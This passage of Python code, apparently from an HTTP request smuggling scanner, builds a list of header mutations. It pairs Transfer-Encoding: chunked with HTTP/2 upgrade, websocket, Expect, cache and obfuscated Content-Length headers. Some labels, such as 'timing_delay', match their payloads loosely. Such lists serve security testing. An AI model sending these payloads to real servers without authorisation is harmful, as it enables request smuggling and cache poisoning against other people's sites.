...
# Add HTTP/2 downgrade attacks
mutations["http2_downgrade"] = render_template("Transfer-Encoding: chunked\r\nConnection: Upgrade, HTTP2-Settings")
mutations["http2_settings"] = render_template("Transfer-Encoding: chunked\r\nHTTP2-Settings: AAMAAABkAAQAAP__")

# Add protocol confusion techniques
mutations["protocol_confusion"] = render_template("Transfer-Encoding: chunked\r\nUpgrade: websocket")
mutations["expect_confusion"] = render_template("Transfer-Encoding: chunked\r\nExpect: 100-continue")

# Add cache poisoning techniques
mutations["cache_control"] = render_template("Transfer-Encoding: chunked\r\nCache-Control: max-age=0")
mutations["vary_header"] = render_template("Transfer-Encoding: chunked\r\nVary: Transfer-Encoding")

# Add timing attack vectors
mutations["timing_delay"] = render_template("Transfer-Encoding: chunked\r\nConnection: keep-alive, Transfer-Encoding")

# Add obfuscated Content-Length techniques
mutations["cl_space_prefix"] = render_template("Transfer-Encoding: chunked\r\n Content-Length: 0")
mutations["cl_tab_prefix"] = render_template("Transfer-Encoding: chunked\r\n\tContent-Length: 0")
mutations["cl_folded"] = render_template("Transfer-Encoding: chunked\r\nContent-\r\n Length: 0")
